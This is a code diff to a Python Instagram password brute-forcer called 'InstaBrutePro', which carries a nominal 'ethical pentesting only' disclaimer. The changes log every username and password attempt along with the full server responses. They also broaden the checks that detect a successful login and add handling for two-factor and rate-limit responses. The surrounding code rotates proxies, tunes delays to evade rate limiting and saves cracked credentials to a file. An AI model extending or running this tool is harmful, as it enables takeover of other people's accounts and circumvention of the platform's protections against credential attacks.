@@ -15,6 +15,10 @@ import socket
 from queue import Queue
 from concurrent.futures import ThreadPoolExecutor
 import urllib.parse
+import logging
+
+# Setup logging
+logging.basicConfig(filename='debug.log', level=logging.DEBUG, format='%(asctime)s - %(message)s')
 
 # Colors
 class Colors:
@@ -31,7 +35,7 @@ print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
 print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
 print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
 print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
-print(f"           {Colors.CYAN} InstaBrutePro v2.1 - by Soly {Colors.NC}")
+print(f"           {Colors.CYAN} InstaBrutePro v2.2 - by Soly {Colors.NC}")
 print(f"{Colors.YELLOW}[*] Ultimate Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
 print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL (CFAA).{Colors.NC}\n")
 
@@ -241,26 +245,31 @@ def try_password(username, password, proxy, csrf):
         resp = session.post(LOGIN_URL, data=signed, timeout=10)
         attempts_since_last_proxy_refresh += 1
         time.sleep(current_delay + random.uniform(0, 0.5))
-        if '"authenticated":true' in resp.text:
+        # Log response for debugging
+        logging.debug(f"Attempted {username}:{password} via {proxy} - Response: {resp.text}")
+        # Check for successful login
+        if any(x in resp.text for x in ['"authenticated":true', '"status":"ok"', '"user_id"']):
             with lock:
                 print(f"{Colors.GREEN}[+] CRACKED! {username}:{password}{Colors.NC}")
                 with open('hits/cracked.txt', 'a') as f:
                     f.write(f"{username}:{password}\n")
                 found = True
                 return True
-        elif 'checkpoint_required' in resp.text:
-            print(f"{Colors.YELLOW}[!] Checkpoint on {password} - Manual verify?{Colors.NC}")
+        elif 'checkpoint_required' in resp.text or 'two_factor_required' in resp.text:
+            print(f"{Colors.YELLOW}[!] Checkpoint/2FA on {password} - Manual verify required!{Colors.NC}")
+            logging.debug(f"Checkpoint/2FA for {password}: {resp.text}")
             current_delay = min(current_delay * 2, 2.0)  # Increase delay
-        elif '"spam":true' in resp.text:
+        elif '"spam":true' in resp.text or 'rate_limit' in resp.text:
             print(f"{Colors.RED}[!] Rate limit - Rotating proxy{Colors.NC}")
             current_delay = min(current_delay * 2, 2.0)
             return False
         else:
-            print(f"{Colors.CYAN}[-] Fail: {password[:15]}...{Colors.NC}")
+            print(f"{Colors.CYAN}[-] Fail: {password}{Colors.NC}")
             current_delay = max(current_delay * 0.9, DELAY)  # Decrease delay if stable
         return False
     except Exception as e:
         print(f"{Colors.RED}[!] Error: {e}{Colors.NC}")
+        logging.debug(f"Error for {password}: {str(e)}")
         current_delay = min(current_delay * 2, 2.0)
         return False
     finally:
